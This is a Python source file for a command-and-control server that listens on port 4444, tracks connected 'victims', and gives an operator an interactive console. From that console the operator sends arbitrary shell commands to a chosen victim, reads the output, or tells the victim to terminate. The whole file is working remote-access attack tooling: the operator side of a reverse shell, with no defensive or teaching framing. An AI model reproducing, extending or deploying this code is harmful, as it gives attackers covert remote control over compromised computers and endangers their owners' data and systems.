import socket
import threading
import json
import sys
import subprocess
import time
import os

class InteractVictim():

    def _victim_help(self):
        """Displays available command that can be run on a victim."""

        victim_cmd = {
            "help\t": "Print this help menu.",
            "back\t": "Return to the console(background to current connection).",
            "    \t": "All default commands of the system."
        }

        print("[+] Help menu.\n")
        print("Command\t\tDescription")

        for cmd in victim_cmd:
            print(f"{cmd}\t{victim_cmd.get(cmd)}")

    def _send(self, conn:socket.socket, data:str):
        """Sends data as json to conn."""

        conn.sendall(json.dumps(data).encode())

    def _upload(self):
        pass

    def _receive(self, conn:socket.socket):
        """Return data received from the conn."""
        json_data = ""

        while True:
            try:
                chunk = conn.recv(1024)

                if not chunk:
                    return None
                
                json_data += chunk.decode('utf-8')
                return json.loads(json_data)
            
            except ValueError:
                continue
            except (ConnectionResetError, OSError):
                # Socket was closed/reset.
                return None

    def victim_console(self, victim_id:int, victim_conn:socket.socket) -> None:
    
        while victim_conn:
        
            data = input(f"{victim_id}-> ").strip(' ')
    
            if data in ["help", "back"]:

                if "help" == data:
                    self._victim_help()
                else:
                    break
    
            else:
                self._send(victim_conn, data)
        
                receive_data = self._receive(victim_conn)
            
                if not receive_data:
                    continue
    
                else:
                    print(receive_data)
        return

class Server():

    def __init__(self, ip:str, port:int):

        self.victim_console = InteractVictim()
        self.ip = ip
        self.port = port
        self.is_server_on = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.victims_dict = {} # Stores conn of the victim(s)
        self.victim_id = 0
        self.console_cmd = {
            "help\t": "Print this help menu.",
            "exit\t": "Exit the program",
            "kill\t": "Kill a connection from ID.",
            "jobs\t": "To see connected victims.",
            "interact": "Interact with one of the victim.",
            "!cmd\t" : "Run terminal command in the host.",
        }

    def _accept_connection(self) -> None:
        """Adds conn, addr to connected_client dict."""

        while self.is_server_on:

            try:
                conn, addr = self.sock.accept()
                self.victim_id += 1
                print(f"Got connection from {addr}")

                self.victims_dict.update({self.victim_id: conn})

            except Exception as e:
                print(e)
                

    def _close_connection(self, victim_id:int) -> None:

        conn:socket.socket = self.victims_dict.get(victim_id)

        try:
            print(f"[+] Closing connection with {conn}")

            self.victim_console._send(conn, "kill yourself")
            time.sleep(0.5)
            conn.close()

            self.victim_id -= 1
            self.victims_dict.pop(victim_id)

        except Exception as e:
            print(f"[!] Error occurred: {e}")
            return

    def _run_on_host(self, command) -> str:
        """Command to run in the Server through the console."""

        try:

            if command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                except OSError:
                    return f"Directory {command[3:]} does not exits!"
                
            else:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                result = process.stdout.read() + process.stderr.read()
                return result
            
        except Exception as e:
           return e

    def _console_help(self):
        """Displays available command that can be run on the console"""

        print("[+] Help menu.")
        print("Command\t\tDescription")

        for cmd in self.console_cmd:
            print(f"{cmd}\t{self.console_cmd.get(cmd)}")

    def _victim_exists(self, id:int) -> bool:
        """Takes victim id to check if it exists or not. Returns True if victim exists, else False."""

        if id not in self.victims_dict.keys():
            return False

        return True

    def _list_victims(self):
        print(f"[+] Total {self.victim_id} victims...")
        print("ID\tVictim")

        for id in self.victims_dict:
            print(f"{id}\t{self.victims_dict.get(id)}")

    def console(self):
        """Provides an interactive console to work with."""

        while self.is_server_on:

            try:
                cmd = input("--> ").lower().strip(' ')

                if not cmd:
                    continue

                elif cmd == "help":
                    self._console_help()

                elif cmd.startswith("!"):
                    cmd_output = self._run_on_host(cmd[1:])

                    if cmd_output:
                        print(cmd_output)
    
                elif cmd == "exit":
                    self.is_server_on = False
    
                    # Close a specific connection
                elif cmd.startswith("kill"):
                    id = int(cmd[4:].strip(' '))

                    if not self._victim_exists(id):
                        print("[-] Failed to kill victim.")
                        print(f"[!] No client associated with that ID, {id}.")
                        continue

                    self._close_connection(id)
    
                elif cmd == "jobs":
                    self._list_victims()
    
                elif cmd[:8] == "interact":
                    id = int(cmd[8:])

                    if not self._victim_exists(id):
                        print("[-] Connot interact with victim {id}.")
                        print(f"[-] Victim with ID {id} does not exists.\n")
                        return
                    
                    self.victim_console.victim_console(id, self.victims_dict.get(id))
    
                else:
                    print("[-] Please enter a valid command\n")
    
    
            except KeyboardInterrupt:
                print("[+] type 'exit' to exit.\n")
    
            except Exception as e:
                print(e)

    def start_server(self):

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.ip, self.port))
        self.sock.listen(0)
        print(f"[+] Server listening on {self.ip}:{self.port}...")

    def main(self):
        
        print("[+] Starting server...")

        try:
            self.start_server()
            self.is_server_on = True
        except Exception as e:
            print(f"[!] {e}")
            sys.exit(1)

        if not self.is_server_on:
            print("[!] Failed to start the server...")

        try:
            print("[+] Waiting for victim to connect...")
            a_t = threading.Thread(target=self._accept_connection, daemon=True)
            a_t.start()
        except Exception as e:
            print(f"[!] {e}")

        try:
            print("[+] Type 'help' for menu.")
            c_t = threading.Thread(target=self.console)
            c_t.start()
        except Exception as e:
            print(f"[!] {e}")


if __name__ == "__main__":
    server = Server("127.0.0.1", 4444)
    server.main()